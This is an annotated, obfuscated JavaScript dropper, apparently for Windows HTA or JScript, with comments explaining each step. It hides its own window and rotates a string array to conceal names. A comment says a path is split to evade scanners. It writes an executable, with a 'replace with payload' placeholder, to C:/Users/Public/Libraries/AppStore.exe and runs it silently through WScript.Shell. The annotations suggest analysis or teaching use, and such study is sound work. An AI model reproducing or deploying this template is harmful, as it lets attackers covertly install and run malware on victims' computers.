var _0x4fba = [
  'OpenTextFile', 'CreateTextFile', '245822eefsqR', '598829yCFgdo',
  'close', '302606ILGEZd', '124169YwNuaX', 'resizeTo', 'Close', 'Write',
  '718973kiZVEV', 'fromCharCode', 'C:/U' + 'sers/Publi' + 'c/Librarie' +'s/App' + 'Store.e' + 'xe',
  '108898gckcJk', '1hfvbvr', '1oCpDrk', '1TeNYee', '392776SHsKeZ'
] // split the path string to make automated scanning more difficult

// Pointless second argument for obfuscation
var _0x187d = function(_0x1d5195, _0x59a857) {
  _0x1d5195 = _0x1d5195 - 0x1dc;
  var _0x4fbae6 = _0x4fba[_0x1d5195];
  return _0x4fbae6;
}

var _0x556975 = _0x187d // Function alias

// self invoking function
// arg1: the command array _0x4fba
// arg2: the value 0x6d993 == 448915
// result: 
(function(_0x284e13, _0x5d8387) {
  var _0x113863 = _0x187d; // Function alias
  // Reorders the array elements until they are in the order:
  // [
  //  fromCharCode, C:/Users/Public/Libraries/AppStore.exe,
  //  108898gckcJk, 1hfvbvr, 1oCpDrk, 1TeNYee, 392776SHsKeZ,
  //  OpenTextFile, CreateTextFile, 245822eefsqR, 598829yCFgdo,
  //  close, 302606ILGEZd, 124169YwNuaX, resizeTo, Close, Write, 
  //  718973kiZVEV
  // ]
  while (!![]) {
    try {
      var _0x589f0d = parseInt(_0x113863(0x1e2)) + -parseInt(_0x113863(0x1df)) 
        * parseInt(_0x113863(0x1e8)) + parseInt(_0x113863(0x1de))
        + parseInt(_0x113863(0x1e6)) + -parseInt(_0x113863(0x1ed))
        + -parseInt(_0x113863(0x1e1)) * -parseInt(_0x113863(0x1e5))
        + parseInt(_0x113863(0x1e9)) * parseInt(_0x113863(0x1e0));
      if (_0x589f0d === _0x5d8387) break;
      else _0x284e13['push'](_0x284e13['shift']()); // places first element at the back of arr
    } catch (_0xecf87d) {
      // the error path ultimately does the same as the 
      // normal path if _0x589f0d != _0x5d8387 (second arg)
      _0x284e13['push'](_0x284e13['shift']()); // places first element at the back of arr
    }
  }
}(_0x4fba, 0x6d993), window[_0x556975(0x1ea)](0x0, 0x0)); // Calls window.resizeTo(0, 0)

try {
  var b = new ActiveXObject('Scripting.FileSystemObject'),
    d = _0x556975(0x1dd); // d = 'C:/Users/Public/Libraries/AppStore.exe'

  e = b[_0x556975(0x1e4)](d, !![]), //call Scripting.FileSystemObject.CreateTextFile(path, true)
    e[_0x556975(0x1ec)]('MZ'), // call Write('MZ') on the created file
    e['Close'](); // close the file
  var data = [144, 3, 0, 4, 0, 65535, 0, 184], // replace with payload
      i, len;
  len = data['length'];
  var content = '';
  for (i = 0x0; i < len; i++) {
    content += String[_0x556975(0x1dc)](data[i]); // content += String.fromCharCode(data[i])
  }
  e = b[_0x556975(0x1e3)](d, 0x8, ![], -0x1), // call Scripting.FileSystemObject.OpenTextFile(path, 8, false, -1)
    e[_0x556975(0x1ec)](content), // call Write(content) on the opened file
    e[_0x556975(0x1eb)](); // close the file
  var c = new ActiveXObject('WScript.Shell');
  c['Run'](d, 0x0); // run the payload
  
} catch (_0x1f5265) {}
window[_0x556975(0x1e7)](); // window.close()

